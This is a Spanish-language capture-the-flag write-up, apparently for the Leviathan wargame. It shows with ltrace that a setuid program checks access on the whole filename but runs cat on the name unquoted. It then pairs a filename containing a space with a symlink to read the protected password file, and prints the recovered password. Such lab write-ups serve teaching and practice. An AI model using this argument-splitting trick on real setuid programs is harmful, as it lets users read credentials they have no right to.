Notamos que hay un archivo ejecutable en el directorio de usuario que imprime un archivo,
pero si le pedimos que lea el archivo con la contraseña nos indica que no
tenemos permisos.

```bash
$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Lo ejecutamos con `ltrace` para ver que llamadas a bibliotecas realiza

```bash
$ ltrace ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(0x80491e6, 2, 0xffffd4c4, 0 <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                = -1
```

Vemos que primero trata de acceder al archivo, pero como no tiene permisos no
continua el programa

Probamos con un archivo que si podamos ver, para esto creamos una carpeta
temporal y movemos el ejecutable allí

```bash
$ ltrace ./printfile file1.txt
__libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...>
access("file1.txt", 4)                                     = 0
snprintf("/bin/cat file1.txt", 511, "/bin/cat %s", "file1.txt") = 18
geteuid()                                                  = 12002
geteuid()                                                  = 12002
setreuid(12002, 12002)                                     = 0
system("/bin/cat file1.txt"File 1
...
```

Vemos que primero trata de acceder al archivo, si puede hacerlo entonces
construye el comando, y obtiene el id de usuario efectivo, y establece el id de
usuario real.

Probamos como se comporta el programa con un archivo con espacios.

```bash
$ ltrace ./printfile "file 1 and 2.txt"
__libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...>
access("file 1 and 2.txt", 4)                            = 0
snprintf("/bin/cat file 1 and 2.txt", 511, "/bin/cat %s", "file 1 and 2.txt") = 25
...
system("/bin/cat file 1 and 2.txt"/bin/cat: file: No such file or directory
...
```

Vemos que pregunta por el acceso del archivo completo, pero al momento de
realizar el cat se olvida de las comillas, por lo que este solo funcionaría con
el primer archivo.

Podemos probar darle un path con espacio, cuya resolución completa este permitida, pero que contenga como primer argumento un path a un link simbolico a la contraseña.

```bash
$ touch "leviathan3 allowed"
$ ln -s /etc/leviathan_pass/leviathan3 leviathan3
```

Luego, podemos construir una dirección que apunte a "leviathan3 allowed", pero
donde `cat` reciba "leviathan" como primer argumento.

```bash
$ ~/printfile "leviathan3 allowed"
Q0G8j4sakn
...
```

